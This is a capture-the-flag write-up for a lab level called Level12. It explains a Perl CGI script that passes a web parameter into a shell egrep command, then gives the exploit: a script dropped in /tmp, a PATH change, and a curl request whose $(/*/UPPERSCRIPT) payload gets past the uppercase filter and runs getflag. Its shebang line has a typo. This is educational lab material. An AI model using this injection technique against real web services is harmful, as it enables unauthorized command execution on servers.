
# Level12 Exploitation - Code Injection Vulnerability

## Description
The web application for Level12 has a CGI script that takes user input through the `x` and `y` parameters. The script processes these inputs and uses the `egrep` command to search a file (`/tmp/xd`). The vulnerability arises from how user input is directly passed into the `egrep` command without sanitization.

## Vulnerable Code Explanation
Here is the relevant section of the vulnerable CGI script with comments explaining the functionality:

```perl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param}; 
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];  # Get argument 1 (param "y").
  $xx = $_[0];  # Get argument 0 (param "x").
  $xx =~ tr/a-z/A-Z/;  # Convert all characters in param "x" to uppercase.
  $xx =~ s/\s.*//; # Remove all characters after the first space in param "x".
  @output = `egrep "^$xx" /tmp/xd 2>&1`; # Execute the egrep command.
  foreach $line (@output) { # Loop over the output of egrep.
      ($f, $s) = split(/:/, $line); # Split each line into two parts.
      if($s =~ $nn) { # If the second part contains param "y", return true.
          return 1; 
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) { # If the result of function `t` is true.
      print(".."); 
  } else {
      print(".");
  }    
}

n(t(param("x"), param("y"))); # Call the function `t` with parameters from the web form.
```

## Vulnerability
The vulnerability exists in the following line:
```perl
@output = `egrep "^$xx" /tmp/xd 2>&1`;
```
Here, the `$xx` parameter is directly inserted into a shell command. we can inject arbitrary commands.

## Exploitation Steps
### Step 1: Understand the CGI Script Behavior
The script:
- Converts the `x` parameter to uppercase and removes characters after the first space.
- Uses the result to run an `egrep` command.
- Checks if the `y` parameter matches the second part of the output.

### Step 2: Plan the Exploit
We exploit the command injection by crafting the `x` parameter to execute arbitrary commands on the server. For example:
- Create a malicious script to execute `getflag` and redirect the output to `/tmp/flag`.
- Inject the script's path using the `x` parameter.

### Step 3: Create the Exploit Script
1. Write a malicious script to `/tmp`:
```bash
echo '#!bin/sh' > /tmp/UPPERSCRIPT
echo 'getflag > /tmp/flag' >> /tmp/UPPERSCRIPT
chmod 777 /tmp/UPPERSCRIPT
export PATH=/tmp:$PATH

```
permissions must be 777 otherways it wont execute. 
2. Use `curl` to pass the malicious input to the CGI application:
```bash
curl "http://localhost:4646?x=\$(/*/UPPERSCRIPT)&y=value"
```

### Step 4: Retrieve the Flag
The `getflag` output will be written to `/tmp/flag`. Access the file to retrieve the flag:
```bash
cat /tmp/flag
```